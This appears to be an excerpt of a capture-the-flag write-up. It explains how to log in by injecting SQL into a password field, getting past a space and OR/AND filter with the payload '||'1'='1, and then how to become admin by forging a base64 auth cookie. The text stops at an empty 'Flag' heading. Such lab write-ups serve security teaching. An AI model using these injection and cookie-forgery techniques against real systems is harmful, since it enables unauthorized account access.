Webex Question:
**SQL Injection (password field only):**  
   - The backend query is similar to:  
     ```sql
     SELECT * FROM users WHERE username = 'target_user' AND password = '$input';
     ```
   - The application sanitizes input:  
     - Blocks spaces → must use `/****/` or no spaces.  
     - Blocks keywords `OR` and `AND`.  
   - Therefore, a simple payload like `' OR '1'='1` won’t work.  
   - Instead, use concatenation with `||` to bypass the password check.  
     Example input:  
     ```
     '||'1'='1
     ```
   - This logs you in as `target_user`.

2. **Cookie Manipulation:**  
   - Once logged in, the app issues a cookie:  
     ```
     auth=base64("target_user:something")
     ```
   - To escalate, modify the cookie to:  
     ```
     auth=base64("admin:something")
     ```
   - Refreshing the page with the modified cookie reveals the admin’s private note containing the flag.

### Flag
